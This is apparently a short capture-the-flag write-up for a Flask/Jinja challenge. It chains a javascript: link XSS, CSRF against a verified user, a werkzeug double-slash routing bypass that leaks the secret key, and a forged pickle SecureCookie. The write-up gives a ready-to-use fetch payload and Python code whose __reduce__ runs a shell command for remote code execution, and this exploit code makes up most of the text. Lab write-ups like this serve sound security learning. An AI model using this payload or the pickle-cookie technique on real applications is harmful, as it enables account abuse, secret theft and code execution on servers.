
From jinja docs:
```
There is one class of XSS issues that Jinja’s escaping does not protect against. The a tag’s href attribute can contain a javascript: URI, which the browser will execute when clicked if not secured properly.

<a href="{{ value }}">click here</a>
<a href="javascript:alert('unsafe');">click here</a>
```

CSP also has 'unsafe-inline' as an option since the site itself uses it

* csrf a verified user into making a post
* verified user posts -> link gets resolved and preview gets cached by server 
* Doing //a/flaginfo bypasses checks on preview due to bug in werkzeug routing https://github.com/pallets/werkzeug/pull/1286
* flaginfo leaks secret key -> use secret key to sign and set cookie 
* werkzeug securecookies use pickle by default -> RCE

First payload:

`[link]javascript:fetch("http://127.0.0.1:5000/newpost",{"headers":{"content-type":"application/x-www-form-urlencoded"},"body":"submission-text%3D%5Blink%5Dhttp%3A%2F%2F127.0.0.1%3A5000%2F%2Fa%2Fflaginfo","method":"POST"})`


Should leak the secret key `superdupersecretflagonkey`.
 
Generate exploit cookie:

```
import subprocess
from werkzeug.contrib.securecookie import SecureCookie

class a(object):
    def __reduce__(self):
        return (subprocess.check_output, (['cat', 'flag.txt']))

SECRET_KEY = 'superdupersecretflagonkey'

print(SecureCookie({'name':a(), 'username':'meow_6bc9e8e1'}, SECRET_KEY).serialize())
```
